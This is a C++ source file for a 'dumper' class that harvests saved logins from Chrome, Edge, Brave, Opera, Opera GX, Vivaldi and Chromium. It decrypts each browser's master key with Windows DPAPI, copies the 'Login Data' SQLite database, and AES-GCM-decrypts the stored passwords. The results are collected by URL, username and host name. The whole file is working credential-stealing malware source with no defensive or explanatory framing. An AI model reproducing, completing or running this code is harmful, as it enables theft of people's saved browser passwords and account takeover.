#include <windows.h>
#include "file_handler.hpp"
#include "plusaes_wrapper.hpp"
#include "json.hpp"
#include "base64.hpp"
#include "utils.hpp"

#ifdef _WIN64
#include "sqlite3/x64/sqlite3.h"
#pragma comment (lib, "sqlite3/x64/sqlite3.lib")
#else
#include "sqlite3/x86/sqlite3.h"
#pragma comment (lib, "sqlite3/x86/sqlite3.lib")
#endif

#pragma comment (lib, "Crypt32")

using namespace std;

typedef tuple<string, string, string> creds;
typedef pair<string, list<creds>> callback_info;
typedef map<string, map<string, map<string, map<string, list<map<string, string>>>>>> results;

class dumper {
private:
    string local = getenv("localappdata"), roaming = getenv("appdata");

    map<string, string> browsers = {
        {"Opera", roaming + "/Opera Software/Opera Stable/"},
        {"OperaGX", roaming + "/Opera Software/Opera GX Stable/"},
        {"Edge", local + "/Microsoft/Edge/User Data/"},
        {"Chromium", local + "/Chromium/User Data/"},
        {"Brave", local + "/BraveSoftware/Brave-Browser/User Data/"},
        {"Chrome", local + "/Google/Chrome/User Data/"},
        {"Vivaldi", local + "/Vivaldi/User Data/"}
    };

    string get_master_key(string path) {
        string content, master;

        try {
            file_handler fh;
            content = fh.read_file(path);
            auto v = nlohmann::json::parse(content);
            content = v["os_crypt"]["encrypted_key"];
        } catch (...) { return ""; }

        Base64::Decode(content, master);

        return decrypt_c32(master.substr(5, master.size() - 5));
    }

    static string decrypt_c32(string data) {
        DATA_BLOB out, buf;
        string dec_buffer;

        buf.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(data.data()));
        buf.cbData = (DWORD) data.size();

        if (CryptUnprotectData(&buf, NULL, NULL, NULL, NULL, NULL, &out)) {
            for (int i = 0; i < out.cbData; i++) {
                dec_buffer += out.pbData[i];
            }

            LocalFree(out.pbData);

            return dec_buffer;
        } else {
            return "";
        }
    }

    static string decrypt_ch(std::string content, std::string master_key) {
        plusaes_wrapper aes;
        std::string buffer, data, gcm_tag, iv;

        iv = content.substr(3, 12);
        buffer = content.substr(15, content.size() - 15);
        gcm_tag = buffer.substr(buffer.size() - 16, 16);
        data = buffer.substr(0, buffer.size() - gcm_tag.size());

        aes.set_tw_iv(const_cast<unsigned char*>(reinterpret_cast<const unsigned char*>(iv.data())));

        return aes.gcm_decrypt(data, master_key, gcm_tag);
    }

    static int callback_sqlite(void* ptr, int argc, char** second, char** first) {
        std::string url, username, password;

        callback_info* infos = static_cast<callback_info*>(ptr);
        creds temp;

        for (int ind = 0; ind < argc; ind++) {
            std::string key = first[ind], value = second[ind];

            if (!value.empty() || !key.empty()) {
                if (key == "origin_url") {
                    std::get<0>(temp) = value;
                }

                if (key == "username_value") {
                    std::get<1>(temp) = value;
                }

                if (key == "password_value") {
                    std::string tag = value.substr(0, 3);
                    std::string decrypted;

                    if (tag == "v10" || tag == "v11") {
                        decrypted = decrypt_ch(value, infos->first);
                    }
                    else {
                        decrypted = decrypt_c32(value);
                    }

                    std::get<2>(temp) = decrypted;
                }
            }
        }

        infos->second.push_back(temp);

        return 0;
    }

    list<creds> sql_chromium(std::string browser, std::string path) {
        file_handler fh;
        std::string path_db, path_mkey;
        callback_info cinfo;

        cinfo.first = get_master_key(path + "Local State");

        if (browser == "Opera" || browser == "OperaGX") {
            path_db = path + "Login Data";
        } else {
            path_db = path + "Default/Login Data";
        }

        try {
            std::string temp_db = path_db + ".d";

            fh.fast_copy_file(path_db, temp_db);

            sqlite3* db;
            sqlite3_stmt* stmt;

            int failed = sqlite3_open(temp_db.c_str(), &db);
            int count = 0;

            if (!failed) {
                failed = sqlite3_prepare_v2(db, "SELECT COUNT(*) FROM logins", -1, &stmt, 0);

                if (!failed) {
                    int res = sqlite3_step(stmt);

                    if (res == SQLITE_ROW) {
                        count = sqlite3_column_int(stmt, 0);
                    }
                }

                if (count > 0) {
                    sqlite3_exec(db, "SELECT origin_url, username_value, password_value FROM logins", callback_sqlite, &cinfo, 0);
                    sqlite3_close(db);
                }
            }

            remove(temp_db.c_str());

        } catch (...) {}

        return cinfo.second;
    }

public:
    results do_dump() {
        string host = get_windows_version() + "@" + getenv("COMPUTERNAME");
        results dump;

        for (auto b : browsers) {
            if (file_or_dir_exists(b.second)) {
                for (auto info : sql_chromium(b.first, b.second)) {
                    if (!std::get<0>(info).empty() && !std::get<1>(info).empty() && !std::get<2>(info).empty()) {
                        dump[host][b.first][std::get<0>(info)]["logins"].push_back(map<string, string>{{"username", std::get<1>(info)}, {"password", std::get<2>(info)}});
                    }
                }
            }
        }

        return dump;
    }
};
